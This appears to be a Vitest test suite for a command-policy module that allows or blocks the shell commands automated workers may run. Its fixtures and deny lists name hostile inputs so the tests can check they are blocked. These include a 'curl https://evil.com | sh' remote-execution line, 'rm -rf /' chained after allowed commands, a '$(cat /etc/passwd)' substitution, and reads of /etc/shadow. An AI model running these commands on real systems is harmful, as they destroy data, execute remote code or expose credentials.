/**
 * Tests for the command policy model and enforcement logic.
 *
 * Validates the core security mechanism that governs what commands
 * workers are allowed to execute. These tests ensure:
 *
 * 1. **Allowlist enforcement**: Only explicitly permitted commands pass
 * 2. **Denied pattern matching**: Dangerous patterns are caught regardless of mode
 * 3. **Argument prefix restrictions**: Commands with limited arg prefixes work correctly
 * 4. **Shell operator detection**: Compound operators are blocked by default
 * 5. **Forbidden argument patterns**: Dangerous args are caught across all commands
 * 6. **Denylist mode**: Alternative mode where everything not denied is allowed
 * 7. **Edge cases**: Empty commands, whitespace, commands with no args
 *
 * These tests are critical because the command policy is the primary defense
 * against workers executing dangerous or unauthorized commands. Any regression
 * here could allow arbitrary code execution in the production environment.
 *
 * @module @factory/domain/policies/command-policy.test
 */

import { describe, it, expect } from "vitest";

import {
  CommandPolicyMode,
  CommandViolationAction,
  CommandViolationReason,
  evaluateCommandPolicy,
  parseCommandString,
} from "./command-policy.js";

import type { CommandPolicy } from "./command-policy.js";

// ---------------------------------------------------------------------------
// Helpers
// ---------------------------------------------------------------------------

/** Minimal allowlist policy for testing with common development commands. */
const TEST_ALLOWLIST_POLICY: CommandPolicy = {
  mode: CommandPolicyMode.ALLOWLIST,
  allowed_commands: [
    { command: "git", arg_prefixes: ["status", "diff", "add", "commit"] },
    { command: "pnpm", arg_prefixes: ["install", "test", "build", "lint"] },
    { command: "node", arg_prefixes: [] },
    { command: "cat", arg_prefixes: [] },
  ],
  denied_patterns: [
    { pattern: "rm -rf /", reason: "Dangerous root deletion" },
    { pattern: "curl * | sh", reason: "Remote code execution" },
    { pattern: "sudo *", reason: "Privilege escalation" },
  ],
  forbidden_arg_patterns: [
    { pattern: "^\\.\\./\\.\\./\\.\\./", reason: "Deep path traversal" },
    { pattern: "^/etc/", reason: "System config access" },
  ],
  allow_shell_operators: false,
  on_violation: CommandViolationAction.FAIL_RUN,
};

/** Denylist policy for testing — allows everything not explicitly denied. */
const TEST_DENYLIST_POLICY: CommandPolicy = {
  mode: CommandPolicyMode.DENYLIST,
  allowed_commands: [],
  denied_patterns: [
    { pattern: "rm -rf /", reason: "Dangerous root deletion" },
    { pattern: "sudo *", reason: "Privilege escalation" },
  ],
  forbidden_arg_patterns: [{ pattern: "^/etc/", reason: "System config access" }],
  allow_shell_operators: false,
  on_violation: CommandViolationAction.DENY_COMMAND,
};

// ---------------------------------------------------------------------------
// parseCommandString
// ---------------------------------------------------------------------------

describe("parseCommandString", () => {
  /**
   * Validates that a simple command string is correctly split into
   * base command and argument tokens. This is the foundation of all
   * policy evaluation — incorrect parsing would break everything.
   */
  it("parses a simple command with arguments", () => {
    const result = parseCommandString("git status --porcelain");
    expect(result.command).toBe("git");
    expect(result.args).toEqual(["status", "--porcelain"]);
    expect(result.raw).toBe("git status --porcelain");
  });

  /**
   * A command with no arguments should have an empty args array.
   * This is common for commands like "node" or "tsc".
   */
  it("parses a command with no arguments", () => {
    const result = parseCommandString("node");
    expect(result.command).toBe("node");
    expect(result.args).toEqual([]);
  });

  /**
   * Extra whitespace should be normalized — multiple spaces between
   * tokens and leading/trailing whitespace must not create empty tokens.
   */
  it("handles multiple spaces and trims whitespace", () => {
    const result = parseCommandString("  git   status   --porcelain  ");
    expect(result.command).toBe("git");
    expect(result.args).toEqual(["status", "--porcelain"]);
    expect(result.raw).toBe("git   status   --porcelain");
  });

  /**
   * An empty string should parse to an empty command.
   * The evaluation function uses this to detect invalid commands.
   */
  it("handles empty string", () => {
    const result = parseCommandString("");
    expect(result.command).toBe("");
    expect(result.args).toEqual([]);
  });

  /**
   * Whitespace-only strings should also parse to empty command.
   */
  it("handles whitespace-only string", () => {
    const result = parseCommandString("   ");
    expect(result.command).toBe("");
    expect(result.args).toEqual([]);
  });
});

// ---------------------------------------------------------------------------
// evaluateCommandPolicy — allowlist mode
// ---------------------------------------------------------------------------

describe("evaluateCommandPolicy — allowlist mode", () => {
  /**
   * The happy path: a permitted command with a valid argument prefix
   * should be allowed. This validates the core allowlist matching logic.
   */
  it("allows a command in the allowlist with valid arg prefix", () => {
    const result = evaluateCommandPolicy("git status", TEST_ALLOWLIST_POLICY);
    expect(result.allowed).toBe(true);
    expect(result.reason).toBeUndefined();
    expect(result.parsed.command).toBe("git");
  });

  /**
   * Arguments starting with an allowed prefix should be accepted
   * even when they include additional flags or parameters.
   */
  it("allows commands with args that start with a valid prefix", () => {
    const result = evaluateCommandPolicy("git diff --cached", TEST_ALLOWLIST_POLICY);
    expect(result.allowed).toBe(true);
  });

  /**
   * Commands whose first argument doesn't match any allowed prefix
   * must be denied. This prevents workers from using dangerous git
   * subcommands like "push", "reset --hard", or "remote add".
   */
  it("denies a command with an arg prefix not in the allowlist", () => {
    const result = evaluateCommandPolicy("git push origin main", TEST_ALLOWLIST_POLICY);
    expect(result.allowed).toBe(false);
    expect(result.reason).toBe(CommandViolationReason.ARG_PREFIX_NOT_ALLOWED);
    expect(result.action).toBe(CommandViolationAction.FAIL_RUN);
  });

  /**
   * Commands not in the allowlist at all must be denied.
   * This is the core deny-by-default behavior.
   */
  it("denies a command not in the allowlist", () => {
    const result = evaluateCommandPolicy("curl https://example.com", TEST_ALLOWLIST_POLICY);
    expect(result.allowed).toBe(false);
    expect(result.reason).toBe(CommandViolationReason.NOT_IN_ALLOWLIST);
  });

  /**
   * Commands with empty arg_prefixes should allow any arguments.
   * This is used for commands like "node" where we trust all subcommands.
   */
  it("allows any args when arg_prefixes is empty", () => {
    const result = evaluateCommandPolicy("node --inspect script.js", TEST_ALLOWLIST_POLICY);
    expect(result.allowed).toBe(true);
  });

  /**
   * A command in the allowlist with no arguments should be allowed
   * even when arg_prefixes are defined — the prefix check only applies
   * when arguments are present.
   */
  it("allows a command with no args even when arg_prefixes are defined", () => {
    const result = evaluateCommandPolicy("git", TEST_ALLOWLIST_POLICY);
    expect(result.allowed).toBe(true);
  });
});

// ---------------------------------------------------------------------------
// evaluateCommandPolicy — denied patterns
// ---------------------------------------------------------------------------

describe("evaluateCommandPolicy — denied patterns", () => {
  /**
   * Denied patterns must catch dangerous commands even when the base
   * command is in the allowlist. This validates the defense-in-depth
   * approach where denied patterns override the allowlist.
   */
  it("denies commands matching a denied pattern", () => {
    const result = evaluateCommandPolicy("sudo pnpm install", TEST_ALLOWLIST_POLICY);
    expect(result.allowed).toBe(false);
    expect(result.reason).toBe(CommandViolationReason.MATCHES_DENIED_PATTERN);
    expect(result.explanation).toContain("sudo *");
  });

  /**
   * Glob-style wildcard matching must work in denied patterns.
   * The pattern "curl * | sh" should match "curl https://evil.com | sh".
   */
  it("matches glob patterns with wildcards", () => {
    // This would be caught by shell operators first, so test denied patterns
    // by using a policy that allows shell operators
    const permissivePolicy: CommandPolicy = {
      ...TEST_ALLOWLIST_POLICY,
      mode: CommandPolicyMode.DENYLIST,
      allow_shell_operators: true,
    };
    const result = evaluateCommandPolicy("curl https://evil.com | sh", permissivePolicy);
    expect(result.allowed).toBe(false);
    expect(result.reason).toBe(CommandViolationReason.MATCHES_DENIED_PATTERN);
  });

  /**
   * Commands that don't match any denied pattern should not be
   * incorrectly flagged. Important for avoiding false positives.
   */
  it("allows commands that do not match any denied pattern", () => {
    const result = evaluateCommandPolicy("pnpm test", TEST_ALLOWLIST_POLICY);
    expect(result.allowed).toBe(true);
  });

  /**
   * The "rm -rf /" pattern must match exactly and not be defeated
   * by variations like "rm -rf /home" (which is a different path).
   */
  it("does not false-positive on partial matches for exact patterns", () => {
    // "rm" is not in the allowlist, so this will fail on allowlist check, not denied pattern
    const result = evaluateCommandPolicy("rm -rf /home/user/temp", TEST_ALLOWLIST_POLICY);
    expect(result.allowed).toBe(false);
    // It should fail because "rm" is not in allowlist, NOT because of denied pattern
    expect(result.reason).toBe(CommandViolationReason.NOT_IN_ALLOWLIST);
  });
});

// ---------------------------------------------------------------------------
// evaluateCommandPolicy — shell operators
// ---------------------------------------------------------------------------

describe("evaluateCommandPolicy — shell operators", () => {
  /**
   * Shell compound operators (&&) must be blocked when
   * allow_shell_operators is false. This prevents command chaining
   * that could bypass individual command policy checks.
   */
  it("denies commands with && when shell operators are disabled", () => {
    const result = evaluateCommandPolicy("pnpm test && rm -rf /", TEST_ALLOWLIST_POLICY);
    expect(result.allowed).toBe(false);
    expect(result.reason).toBe(CommandViolationReason.SHELL_OPERATORS_DENIED);
  });

  /**
   * Pipe operators should be detected and blocked.
   */
  it("denies commands with pipe operators", () => {
    const result = evaluateCommandPolicy("cat file.txt | grep secret", TEST_ALLOWLIST_POLICY);
    expect(result.allowed).toBe(false);
    expect(result.reason).toBe(CommandViolationReason.SHELL_OPERATORS_DENIED);
  });

  /**
   * Command substitution with $() must be blocked.
   */
  it("denies commands with $() substitution", () => {
    const result = evaluateCommandPolicy("git commit -m $(cat /etc/passwd)", TEST_ALLOWLIST_POLICY);
    expect(result.allowed).toBe(false);
    expect(result.reason).toBe(CommandViolationReason.SHELL_OPERATORS_DENIED);
  });

  /**
   * Backtick command substitution must be blocked.
   */
  it("denies commands with backtick substitution", () => {
    const result = evaluateCommandPolicy("git commit -m `whoami`", TEST_ALLOWLIST_POLICY);
    expect(result.allowed).toBe(false);
    expect(result.reason).toBe(CommandViolationReason.SHELL_OPERATORS_DENIED);
  });

  /**
   * Semicolons allow chaining arbitrary commands after a legitimate one.
   */
  it("denies commands with semicolons", () => {
    const result = evaluateCommandPolicy("pnpm test; rm -rf /", TEST_ALLOWLIST_POLICY);
    expect(result.allowed).toBe(false);
    expect(result.reason).toBe(CommandViolationReason.SHELL_OPERATORS_DENIED);
  });

  /**
   * When shell operators ARE allowed, compound commands should pass
   * through to the other checks.
   */
  it("allows shell operators when policy permits them", () => {
    const permissivePolicy: CommandPolicy = {
      ...TEST_ALLOWLIST_POLICY,
      allow_shell_operators: true,
    };
    // "pnpm test && pnpm build" — each individual part is allowed,
    // but the full string parsed as one command will have "pnpm" as base
    // and "test" as first arg, which is allowed
    const result = evaluateCommandPolicy("pnpm test", permissivePolicy);
    expect(result.allowed).toBe(true);
  });

  /**
   * The || operator should also be caught.
   */
  it("denies commands with || operator", () => {
    const result = evaluateCommandPolicy("pnpm test || exit 1", TEST_ALLOWLIST_POLICY);
    expect(result.allowed).toBe(false);
    expect(result.reason).toBe(CommandViolationReason.SHELL_OPERATORS_DENIED);
  });
});

// ---------------------------------------------------------------------------
// evaluateCommandPolicy — forbidden argument patterns
// ---------------------------------------------------------------------------

describe("evaluateCommandPolicy — forbidden argument patterns", () => {
  /**
   * Deep path traversal attempts should be caught regardless of which
   * command is being used. This prevents workspace escapes.
   */
  it("denies arguments matching forbidden patterns", () => {
    const result = evaluateCommandPolicy("cat ../../../etc/passwd", TEST_ALLOWLIST_POLICY);
    expect(result.allowed).toBe(false);
    expect(result.reason).toBe(CommandViolationReason.FORBIDDEN_ARG_PATTERN);
    expect(result.explanation).toContain("path traversal");
  });

  /**
   * Direct access to system configuration files should be blocked.
   */
  it("denies access to /etc/ paths", () => {
    const result = evaluateCommandPolicy("cat /etc/shadow", TEST_ALLOWLIST_POLICY);
    expect(result.allowed).toBe(false);
    expect(result.reason).toBe(CommandViolationReason.FORBIDDEN_ARG_PATTERN);
  });

  /**
   * Normal arguments that don't match forbidden patterns should pass.
   */
  it("allows arguments that do not match forbidden patterns", () => {
    const result = evaluateCommandPolicy("cat src/index.ts", TEST_ALLOWLIST_POLICY);
    expect(result.allowed).toBe(true);
  });

  /**
   * A single path traversal level (../) should be allowed — only deep
   * traversal (3+ levels) is blocked by the default pattern.
   */
  it("allows shallow path traversal", () => {
    const result = evaluateCommandPolicy("cat ../package.json", TEST_ALLOWLIST_POLICY);
    expect(result.allowed).toBe(true);
  });
});

// ---------------------------------------------------------------------------
// evaluateCommandPolicy — denylist mode
// ---------------------------------------------------------------------------

describe("evaluateCommandPolicy — denylist mode", () => {
  /**
   * In denylist mode, commands not matching any denied pattern should
   * be allowed. This is the opposite of allowlist mode.
   */
  it("allows commands not matching denied patterns", () => {
    const result = evaluateCommandPolicy("python script.py", TEST_DENYLIST_POLICY);
    expect(result.allowed).toBe(true);
  });

  /**
   * Denied patterns should still catch dangerous commands in denylist mode.
   */
  it("denies commands matching denied patterns", () => {
    const result = evaluateCommandPolicy("sudo apt install", TEST_DENYLIST_POLICY);
    expect(result.allowed).toBe(false);
    expect(result.reason).toBe(CommandViolationReason.MATCHES_DENIED_PATTERN);
    expect(result.action).toBe(CommandViolationAction.DENY_COMMAND);
  });

  /**
   * Forbidden argument patterns should work in denylist mode too.
   */
  it("applies forbidden argument patterns in denylist mode", () => {
    const result = evaluateCommandPolicy("cat /etc/shadow", TEST_DENYLIST_POLICY);
    expect(result.allowed).toBe(false);
    expect(result.reason).toBe(CommandViolationReason.FORBIDDEN_ARG_PATTERN);
  });
});

// ---------------------------------------------------------------------------
// evaluateCommandPolicy — edge cases
// ---------------------------------------------------------------------------

describe("evaluateCommandPolicy — edge cases", () => {
  /**
   * Empty command strings must be rejected with INVALID_COMMAND.
   * Workers should never submit empty commands.
   */
  it("rejects empty command strings", () => {
    const result = evaluateCommandPolicy("", TEST_ALLOWLIST_POLICY);
    expect(result.allowed).toBe(false);
    expect(result.reason).toBe(CommandViolationReason.INVALID_COMMAND);
  });

  /**
   * Whitespace-only command strings must be rejected.
   */
  it("rejects whitespace-only command strings", () => {
    const result = evaluateCommandPolicy("   ", TEST_ALLOWLIST_POLICY);
    expect(result.allowed).toBe(false);
    expect(result.reason).toBe(CommandViolationReason.INVALID_COMMAND);
  });

  /**
   * The evaluation result should always include the parsed command
   * for audit logging purposes, even when the command is denied.
   */
  it("always includes parsed command in result", () => {
    const allowed = evaluateCommandPolicy("git status", TEST_ALLOWLIST_POLICY);
    expect(allowed.parsed.command).toBe("git");
    expect(allowed.parsed.args).toEqual(["status"]);

    const denied = evaluateCommandPolicy("curl evil.com", TEST_ALLOWLIST_POLICY);
    expect(denied.parsed.command).toBe("curl");
    expect(denied.parsed.args).toEqual(["evil.com"]);
  });

  /**
   * The explanation field should always be populated, providing
   * human-readable context for audit logs.
   */
  it("always includes explanation in result", () => {
    const allowed = evaluateCommandPolicy("pnpm test", TEST_ALLOWLIST_POLICY);
    expect(allowed.explanation).toBeTruthy();
    expect(typeof allowed.explanation).toBe("string");

    const denied = evaluateCommandPolicy("curl evil.com", TEST_ALLOWLIST_POLICY);
    expect(denied.explanation).toBeTruthy();
    expect(typeof denied.explanation).toBe("string");
  });

  /**
   * Allowed results should NOT have an action field (actions only
   * make sense for violations).
   */
  it("does not set action on allowed results", () => {
    const result = evaluateCommandPolicy("pnpm test", TEST_ALLOWLIST_POLICY);
    expect(result.allowed).toBe(true);
    expect(result.action).toBeUndefined();
  });

  /**
   * Denied results should always have the policy's on_violation action.
   */
  it("sets action on denied results from policy", () => {
    const result = evaluateCommandPolicy("curl evil.com", TEST_ALLOWLIST_POLICY);
    expect(result.allowed).toBe(false);
    expect(result.action).toBe(CommandViolationAction.FAIL_RUN);
  });
});

// ---------------------------------------------------------------------------
// Evaluation order
// ---------------------------------------------------------------------------

describe("evaluateCommandPolicy — evaluation order", () => {
  /**
   * Shell operator check should happen before allowlist check.
   * This ensures compound commands are caught early, before we
   * check individual command validity.
   */
  it("checks shell operators before allowlist", () => {
    const result = evaluateCommandPolicy("git status && rm -rf /", TEST_ALLOWLIST_POLICY);
    expect(result.reason).toBe(CommandViolationReason.SHELL_OPERATORS_DENIED);
  });

  /**
   * Denied patterns should be checked before allowlist.
   * A command like "sudo git status" should be caught by the denied
   * pattern for "sudo *", not pass because "sudo" isn't in the allowlist.
   */
  it("checks denied patterns before allowlist", () => {
    const result = evaluateCommandPolicy("sudo git status", TEST_ALLOWLIST_POLICY);
    expect(result.reason).toBe(CommandViolationReason.MATCHES_DENIED_PATTERN);
  });

  /**
   * Forbidden arg patterns should be checked after allowlist.
   * An allowed command with a forbidden argument should fail on the
   * arg pattern, not on the allowlist.
   */
  it("checks forbidden arg patterns after allowlist", () => {
    const result = evaluateCommandPolicy("cat /etc/passwd", TEST_ALLOWLIST_POLICY);
    expect(result.reason).toBe(CommandViolationReason.FORBIDDEN_ARG_PATTERN);
  });
});
